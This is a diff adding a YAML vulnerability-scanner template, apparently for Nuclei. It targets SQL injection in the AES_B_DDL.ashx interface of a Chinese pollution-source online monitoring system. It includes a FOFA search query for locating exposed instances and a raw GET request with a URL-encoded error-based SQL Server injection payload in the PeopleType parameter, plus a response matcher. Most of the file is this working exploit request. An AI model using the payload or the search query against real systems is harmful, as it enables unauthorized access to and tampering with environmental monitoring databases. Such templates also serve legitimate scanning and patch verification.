@@ -1,0 +1,22 @@
+id: wanwei-yingchuang-pollution-monitor-aes_b_ddl-sqli
+
+info:
+  name: 万维盈创污染源在线监控系统AES_B_DDL.ashx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="ImgGwry/download.png" || (body="images/errorpage.gif" && body="错误页面")
+      该系统在AES_B_DDL.ashx处理逻辑中存在SQL注入漏洞，攻击者可通过构造恶意请求参数实现数据库查询操控，可能导致敏感数据泄露或篡改。
+  tags: 万维盈创
+
+http:
+- raw:
+  - |
+    GET /ashx/AES_B_DDL.ashx?CurrentSelect=11&PeopleType=%27%20AND%208691%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28UNICODE%28SQUARE%28NULL%29%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20WnxP HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qjvqj'
